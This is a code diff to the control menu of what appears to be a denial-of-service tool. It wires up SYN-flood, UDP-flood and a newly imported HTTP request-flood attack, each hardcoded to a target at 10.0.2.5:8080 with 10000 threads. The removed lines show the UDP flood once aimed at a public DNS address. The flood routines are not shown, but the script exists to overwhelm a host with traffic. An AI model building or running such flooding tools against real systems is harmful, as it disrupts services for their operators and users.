@@ -1,6 +1,7 @@
 from utils import *
 from syn import *
 from udp import *
+from attackhttp import *
 
 def control():
     RED = "\033[31m"
@@ -24,22 +25,29 @@ Choose wisely: ''').strip())
         clear()
         target = "10.0.2.5" #input("Target (IP or url) >> ").strip()
         port = 8080 #int(input("Target port >> "))
-        num = int(input("Number of threads >> "))
-        numwor = int(input("Number of workens (default 200) >> "))
+        num = 10000 #int(input("Number of threads >> "))
+        numwor = 100 #int(input("Number of workens (default 200) >> "))
         synflood(target, port, num, numwor)
 
         clear()
         results(target, port, num, numwor, "SYN")
     elif(opcao == 2):
         clear()
-        target = "8.8.8.8" #input("Target (IP or url) >> ").strip()
+        target = "10.0.2.5" #input("Target (IP or url) >> ").strip()
         port = 8080 #int(input("Target port >> "))
-        num = int(input("Number of threads >> "))
-        numwor = int(input("Number of workens (default 200) >> "))
+        num = 10000 #int(input("Number of threads >> "))
+        numwor = 100 #int(input("Number of workens (default 200) >> "))
         udpflood(target, port, num, numwor)
 
         clear()
         results(target, port, num, numwor, "UDP")
+    elif(opcao == 3):
+        clear()
+        target = "10.0.2.5" #input("Target (IP or url) >> ").strip()
+        port = 8080 #int(input("Target port >> "))
+        num = 10000 #int(input("Number of threads >> "))
+        numwor = 100 #int(input("Number of workens (default 200) >> "))
+        request_flood(target, port, num, numwor)
 
 control()
     
